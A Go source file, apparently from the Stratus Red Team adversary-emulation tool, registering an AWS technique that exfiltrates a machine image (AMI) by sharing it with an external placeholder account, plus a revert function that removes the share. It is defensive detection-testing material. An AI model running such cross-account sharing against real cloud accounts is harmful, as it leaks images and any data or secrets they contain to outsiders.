package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.exfiltration.ami-sharing",
		FriendlyName: "Exfiltrate an AMI by Sharing It",
		Description: `
Exfiltrates an AMI by sharing it with an external AWS account.

Warm-up: Create an AMI.

Detonation: Share the AMI.
`,
		Platform:                   stratus.AWS,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Exfiltration},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

var amiPublicPermissions = []types.LaunchPermission{
	{UserId: aws.String("012345678901")},
}

func detonate(params map[string]string) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
	amiId := params["ami_id"]

	log.Println("Exfiltrating AMI " + amiId + " by sharing it with an external AWS account")
	_, err := ec2Client.ModifyImageAttribute(context.Background(), &ec2.ModifyImageAttributeInput{
		ImageId: aws.String(amiId),
		LaunchPermission: &types.LaunchPermissionModifications{
			Add: amiPublicPermissions,
		},
	})

	if err != nil {
		return errors.New("Unable to share AMI with external AWS account: " + err.Error())
	}

	return nil
}

func revert(params map[string]string) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
	amiId := params["ami_id"]

	log.Println("Reverting exfiltration of AMI " + amiId + " by removing cross-account sharing")
	_, err := ec2Client.ModifyImageAttribute(context.Background(), &ec2.ModifyImageAttributeInput{
		ImageId: aws.String(amiId),
		LaunchPermission: &types.LaunchPermissionModifications{
			Remove: amiPublicPermissions,
		},
	})

	if err != nil {
		return errors.New("Unable to remove AMI permissions: " + err.Error())
	}

	return nil
}
